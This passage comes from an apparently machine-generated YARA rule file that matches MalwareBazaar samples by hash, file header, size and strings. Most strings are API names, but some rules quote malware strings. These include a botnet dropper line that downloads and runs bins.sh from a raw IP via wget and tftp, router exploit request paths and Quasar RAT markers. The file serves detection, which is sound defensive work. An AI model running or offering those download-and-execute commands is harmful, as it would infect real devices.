        $s5 = "WiNbP"
        $s6 = "RegCloseKey"
        $s7 = "ExitProcess"
        $s8 = "GetModuleHandleA"
        $s9 = "SHELL32.dll"
        $s10 = "WININET.dll"
        $s11 = "GetSystemMetrics"
        $s12 = "LoadLibraryA"
        $s13 = "ADVAPI32.dll"
        $s14 = "SHGetFolderPathA"
        $s15 = "M^CGet"
        $s16 = "sreAD"
        $s17 = "gdiplus.dll"
        $s18 = "HttpOpenRequestA"
        $s19 = "kernel32.dll"
        $s20 = "GetProcAddress"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4816KB and
        all of them
}

rule Windows_11ec084af50a836c2c4e3c6af5c039de625ab989c1e015bb3b9fb8b662e76b3b
{
    meta:
        description = "Auto ML: 11ec084af50a836c2c4e3c6af5c039de625ab989c1e015bb3b9fb8b662e76b3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "kernel32.dll"
        $s5 = "comctl32.dll"
        $s6 = "shell32.dll"
        $s7 = "GetLastError"
        $s8 = "GetConsoleCP"
        $s9 = "WriteConsoleW"
        $s10 = "CloseHandle"
        $s11 = "ReadConsoleW"
        $s12 = "FlatSB_SetScrollProp"
        $s13 = "ImageList_GetIcon"
        $s14 = "SHGetSpecialFolderLocation"
        $s15 = "SHGetDiskFreeSpaceExW"
        $s16 = "eCmd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5410KB and
        all of them
}

rule Windows_a9ed7edf5b5cecaecdf126bafc6c85d3ca918363d874f3c33afc07131bc43c4d
{
    meta:
        description = "Auto ML: a9ed7edf5b5cecaecdf126bafc6c85d3ca918363d874f3c33afc07131bc43c4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "createMT"
        $s6 = "set_ChartArea"
        $s7 = "add_Load"
        $s8 = "dothi_Load"
        $s9 = "F_Detail_Load"
        $s10 = "get_Checked"
        $s11 = "set_Handled"
        $s12 = "set_Legend"
        $s13 = "get_KeyCode"
        $s14 = "set_AutoScaleMode"
        $s15 = "get_Message"
        $s16 = "set_Visible"
        $s17 = "GetTypeFromHandle"
        $s18 = "set_FormBorderStyle"
        $s19 = "set_Name"
        $s20 = "set_Multiline"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 639KB and
        all of them
}

rule Linux_aa03a988d8b7a00e62e62c8f29c72ac5db583f3ef307860e05bb2da31b532068
{
    meta:
        description = "Auto ML: aa03a988d8b7a00e62e62c8f29c72ac5db583f3ef307860e05bb2da31b532068"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 48KB and
        all of them
}

rule Windows_aa29b800e8a344b2917de03c2c6fac3e02730eb46e2a1215bb97f6daef1588a6
{
    meta:
        description = "Auto ML: aa29b800e8a344b2917de03c2c6fac3e02730eb46e2a1215bb97f6daef1588a6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "delete"
        $s6 = "delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "`local static thread guard'"
        $s10 = "FlsGetValue"
        $s11 = "FlsSetValue"
        $s12 = "CorExitProcess"
        $s13 = "AreFileApisANSI"
        $s14 = "AppPolicyGetProcessTerminationMethod"
        $s15 = ".text$mn"
        $s16 = ".text$x"
        $s17 = ".rdata"
        $s18 = ".rdata$r"
        $s19 = ".rdata$sxdata"
        $s20 = ".rdata$voltmd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 690KB and
        all of them
}

rule Windows_aa2e39c3f1f594f06b32a7f129a715271dd03fb65f7ae2df575fe8af510e4e5a
{
    meta:
        description = "Auto ML: aa2e39c3f1f594f06b32a7f129a715271dd03fb65f7ae2df575fe8af510e4e5a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 231KB and
        all of them
}

rule Windows_aa33870935c58f52e135185cea818070c6b4bc4409f5dbc1ed99168c86c0fdef
{
    meta:
        description = "Auto ML: aa33870935c58f52e135185cea818070c6b4bc4409f5dbc1ed99168c86c0fdef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Diagram.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 288KB and
        all of them
}

rule Windows_aa3f635e15b1e53709d01a66e31958b649d40122541f1aa207805f0ce31f0fe9
{
    meta:
        description = "Auto ML: aa3f635e15b1e53709d01a66e31958b649d40122541f1aa207805f0ce31f0fe9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "tJvit3OSTfReAdRaD9t"
        $s14 = "<Module>{133D5916-22F7-4C5F-A164-B9D3396F7EC0}"
        $s15 = "System.Text"
        $s16 = "get_Length"
        $s17 = "get_Chars"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1547KB and
        all of them
}

rule Windows_aa5ac6cee2917246b3713a6ecd71452c2669cb5385f392a1b6594a887be616a6
{
    meta:
        description = "Auto ML: aa5ac6cee2917246b3713a6ecd71452c2669cb5385f392a1b6594a887be616a6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "MGET"
        $s5 = "pSEt"
        $s6 = "3yh!A=1<8setoNA"
        $s7 = "DbSet`1"
        $s8 = "HashSet`1"
        $s9 = "get_seat2"
        $s10 = "<Module>"
        $s11 = "System.IO"
        $s12 = "System.Collections.Generic"
        $s13 = "get_MovieId"
        $s14 = "set_MovieId"
        $s15 = "get_HallId"
        $s16 = "set_HallId"
        $s17 = "get_UserId"
        $s18 = "set_UserId"
        $s19 = "userId"
        $s20 = "get_ChairId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1772KB and
        all of them
}

rule Windows_aa60573d3d1a56190858edb2df0344b9d1082f0eae840004941a1d6b30a1b804
{
    meta:
        description = "Auto ML: aa60573d3d1a56190858edb2df0344b9d1082f0eae840004941a1d6b30a1b804"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ThreadSafeObjectProvider`1"
        $s5 = "get_Form1"
        $s6 = "set_Form1"
        $s7 = "<Module>"
        $s8 = "System.IO"
        $s9 = "Create__Instance__"
        $s10 = "Form1_Load"
        $s11 = "add_Load"
        $s12 = "get_IsDisposed"
        $s13 = "m_FormBeingCreated"
        $s14 = "set_IsSingleInstance"
        $s15 = "CreateInstance"
        $s16 = "get_GetInstance"
        $s17 = "GetHashCode"
        $s18 = "set_AutoScaleMode"
        $s19 = "get_Message"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 406KB and
        all of them
}

rule Windows_aaa87e001ad26d24cc977adb90d0c6224a31a147689903cb66f8b8ac9c857003
{
    meta:
        description = "Auto ML: aaa87e001ad26d24cc977adb90d0c6224a31a147689903cb66f8b8ac9c857003"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = "WSAGetLastError"
        $s4 = "__WSAFDIsSet"
        $s5 = "closesocket"
        $s6 = "connect"
        $s7 = "gethostbyname"
        $s8 = "ioctlsocket"
        $s9 = "socket"
        $s10 = "CoCreateInstance"
        $s11 = "DeleteUrlCacheEntry"
        $s12 = "ExitProcess"
        $s13 = "ExitThread"
        $s14 = "FileTimeToLocalFileTime"
        $s15 = "FileTimeToSystemTime"
        $s16 = "FindClose"
        $s17 = "FindFirstFileA"
        $s18 = "FindNextFileA"
        $s19 = "GetCommandLineA"
        $s20 = "GetCurrentProcessId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 280KB and
        all of them
}

rule Linux_aae93026d0c51a595061128f3ac36084ee958c7a919f57b3fdcdda30696b6fcb
{
    meta:
        description = "Auto ML: aae93026d0c51a595061128f3ac36084ee958c7a919f57b3fdcdda30696b6fcb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 134KB and
        all of them
}

rule Linux_0123fe36cfdc574d6b73573aee5c1a4ccdd66027beceb5d9dac4914e5b2efbb6
{
    meta:
        description = "Auto ML: 0123fe36cfdc574d6b73573aee5c1a4ccdd66027beceb5d9dac4914e5b2efbb6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 116KB and
        all of them
}

rule Windows_120b4cf74b478310991b88f2334efb065296fcd67ac3ea408d54ad3052f2d908
{
    meta:
        description = "Auto ML: 120b4cf74b478310991b88f2334efb065296fcd67ac3ea408d54ad3052f2d908"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "advapi32.dll"
        $s7 = "setupx.dll"
        $s8 = "setupapi.dll"
        $s9 = "advpack.dll"
        $s10 = "wininit.ini"
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s12 = "HeapSetInformation"
        $s13 = "DecryptFileA"
        $s14 = "SHOWWINDOW"
        $s15 = "ADMQCMD"
        $s16 = "USRQCMD"
        $s17 = "LoadString() Error.  Could not load string resource."
        $s18 = "FILESIZES"
        $s19 = "UPDFILE%lu"
        $s20 = ".text$mn"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6052KB and
        all of them
}

rule Windows_aafa82fb621b4843c3ae89bb8beddfe66244e203149880b79a4e8f42f5a7c4b9
{
    meta:
        description = "Auto ML: aafa82fb621b4843c3ae89bb8beddfe66244e203149880b79a4e8f42f5a7c4b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "ADVAPI32.dll"
        $s6 = "KERNEL32.dll"
        $s7 = "NTDLL.DLL"
        $s8 = "USER32.dll"
        $s9 = "msvcrt.dll"
        $s10 = "OLEAUT32.dll"
        $s11 = "SHLWAPI.dll"
        $s12 = "SETUPAPI.dll"
        $s13 = "COMDLG32.dll"
        $s14 = "SHELL32.dll"
        $s15 = "COMCTL32.dll"
        $s16 = "RegOpenKeyExW"
        $s17 = "RegCloseKey"
        $s18 = "RegGetValueW"
        $s19 = "RegSetValueExW"
        $s20 = "GetVersionExW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 369KB and
        all of them
}

rule Linux_ab0dd7675c9e379aea6638f7b2f0f2d4ef226bb189575894840d0e4480aac63a
{
    meta:
        description = "Auto ML: ab0dd7675c9e379aea6638f7b2f0f2d4ef226bb189575894840d0e4480aac63a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB and
        all of them
}

rule Windows_ab143dacd2bb2cc4c38822ad99b628b5c763b8ea2b01ac6971c7dbf0bdc41fb2
{
    meta:
        description = "Auto ML: ab143dacd2bb2cc4c38822ad99b628b5c763b8ea2b01ac6971c7dbf0bdc41fb2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "kernel32"
        $s5 = "<Module>"
        $s6 = "KEY_SET_VALUE"
        $s7 = "System.IO"
        $s8 = "HKEY_CURRENT_USER"
        $s9 = "System.Collections.Generic"
        $s10 = "get_CommandId"
        $s11 = "set_CommandId"
        $s12 = "get_TenantId"
        $s13 = "set_TenantId"
        $s14 = "get_ClientId"
        $s15 = "set_ClientId"
        $s16 = "get_CanRead"
        $s17 = "Thread"
        $s18 = "Load"
        $s19 = "get_IsCreated"
        $s20 = "set_IsCreated"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 40KB and
        all of them
}

rule Linux_ab74f0b951d0f7862d3f21786d05e13857ece4f306ba78b5c58ec98ad3ea69a4
{
    meta:
        description = "Auto ML: ab74f0b951d0f7862d3f21786d05e13857ece4f306ba78b5c58ec98ad3ea69a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1"
        $s2 = "User"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 53KB and
        all of them
}

rule Linux_ab815a4a83fe7d5213b6e5a80d0845f2055d49330fd36fe5d873604eb1b249b7
{
    meta:
        description = "Auto ML: ab815a4a83fe7d5213b6e5a80d0845f2055d49330fd36fe5d873604eb1b249b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "processor"
        $s4 = "/sys/devices/system/cpu"
        $s5 = "attempts"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 142KB and
        all of them
}

rule Windows_ab9f7995b911511781cfb226027d60173f2ab8f6482372f51756fa40d93b2f59
{
    meta:
        description = "Auto ML: ab9f7995b911511781cfb226027d60173f2ab8f6482372f51756fa40d93b2f59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Kingdom.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{871EFDA5-85E5-4C68-A05C-B5B58D98DA85}"
        $s15 = "<Module>{e67382d2-dfff-4a33-b753-e40b347804e3}"
        $s16 = "get_Days"
        $s17 = "kernel32.dll"
        $s18 = "CreateThread"
        $s19 = "get_Message"
        $s20 = "WriteLine"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 434KB and
        all of them
}

rule Windows_abc8131003a1ec8b9a4a6e9a477392d7fef6b866bbdafdcc08d94b7b760e3a2d
{
    meta:
        description = "Auto ML: abc8131003a1ec8b9a4a6e9a477392d7fef6b866bbdafdcc08d94b7b760e3a2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "#Visibility modifier already defined"
        $s6 = "3Identifier already in use;;'{0}' is already defined"
        $s7 = "~This constructor or property getter/setter method is not meant to be called directly;;'{0}' is not meant to be called directly"
        $s8 = "@The get and set methods of this property do not match each other"
        $s9 = ":A custom attribute class must derive from System.Attribute"
        $s10 = "_Cannot define get_Item or set_Item on an Expando class. Methods reserved for the expando fields"
        $s11 = "mBase class defines get_Item or set_Item, cannot create expando class. Methods reserved for the expando fields"
        $s12 = "MA base class is already marked expando; current specification will be ignored"
        $s13 = "1Member is not deleteable;;'{0}' is not deleteable"
        $s14 = "xMethod in base has a different return type;;Method '{0}' is already defined in a base class with a different return type"
        $s15 = ")Cannot use 'override' and 'hide' together"
        $s16 = "bExpected ','. Write 'identifier : Type' rather than 'Type identifier' to declare a typed parameter"
        $s17 = "5Too many errors. The file might not be a JScript file"
        $s18 = "eSyntax error. Write 'var identifier : Type' rather than 'Type identifier' to declare a typed variable"
        $s19 = "vSyntax error. Write 'function identifier(...) : Type{' rather than 'Type identifier(...){' to declare a typed function"
        $s20 = "fInvalid property declaration. The getter must not have arguments and the setter must have one argument"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 538KB and
        all of them
}

rule Linux_abf520ca91767dbfd1b806f097db517ef8d51a8031b2a20fba275d68f25ec502
{
    meta:
        description = "Auto ML: abf520ca91767dbfd1b806f097db517ef8d51a8031b2a20fba275d68f25ec502"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/bin/systemd"
        $s7 = "bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB and
        all of them
}

rule Windows_ac1ca9910b47c73f279ec42a5bbfc19424805f8dcbd8457d7ef32199219ff70d
{
    meta:
        description = "Auto ML: ac1ca9910b47c73f279ec42a5bbfc19424805f8dcbd8457d7ef32199219ff70d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4701KB and
        all of them
}

rule Windows_ac4ec4cbcf33cf34aaba7c7b1b29c629a6496fc4715037e97a69de1f2cbf0ff7
{
    meta:
        description = "Auto ML: ac4ec4cbcf33cf34aaba7c7b1b29c629a6496fc4715037e97a69de1f2cbf0ff7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "libgcc_s_dw2-1.dll"
        $s5 = "ntdll.dll"
        $s6 = "NtCreateFile"
        $s7 = "NtWriteFile"
        $s8 = "NtClose"
        $s9 = "Open Success!"
        $s10 = "Write to file succeeded!"
        $s11 = "Write to file failed with status 0x%X"
        $s12 = "DeleteCriticalSection"
        $s13 = "ExitProcess"
        $s14 = "FindClose"
        $s15 = "FindFirstFileA"
        $s16 = "FindNextFileA"
        $s17 = "GetCommandLineA"
        $s18 = "GetLastError"
        $s19 = "GetModuleFileNameA"
        $s20 = "GetModuleHandleA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 60KB and
        all of them
}

rule Windows_120c0317f33b1f2d23354d55410f22ea28814cdcb1597d281a3c2ab87219440a
{
    meta:
        description = "Auto ML: 120c0317f33b1f2d23354d55410f22ea28814cdcb1597d281a3c2ab87219440a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "user32"
        $s6 = "kernel32.dll"
        $s7 = "user32.dll"
        $s8 = "kernel32"
        $s9 = "GetInputState"
        $s10 = "OpenEventA"
        $s11 = "CreateEventA"
        $s12 = "GetCurrentProcessId"
        $s13 = "EnumWindows"
        $s14 = "IsWindowVisible"
        $s15 = "GetWindowThreadProcessId"
        $s16 = "GetWindowTextA"
        $s17 = "GetClassNameA"
        $s18 = "FindWindowExA"
        $s19 = "CreateToolhelp32Snapshot"
        $s20 = "Module32First"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 660KB and
        all of them
}

rule Linux_ac53d53635f57cf0c9a7eff121db766e19e762492933e45b09eb210710cda753
{
    meta:
        description = "Auto ML: ac53d53635f57cf0c9a7eff121db766e19e762492933e45b09eb210710cda753"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "usybox wget -g 193.23"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
        $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB and
        all of them
}

rule Windows_acfbcffe5730ef33a9497e56f399bac48fd85646f4320caa3cdc9445472cbff0
{
    meta:
        description = "Auto ML: acfbcffe5730ef33a9497e56f399bac48fd85646f4320caa3cdc9445472cbff0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB and
        all of them
}

rule Linux_ad01190688201cac6b5815d670066f247f34b50d7dd2ff40b05ae85d204f850e
{
    meta:
        description = "Auto ML: ad01190688201cac6b5815d670066f247f34b50d7dd2ff40b05ae85d204f850e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
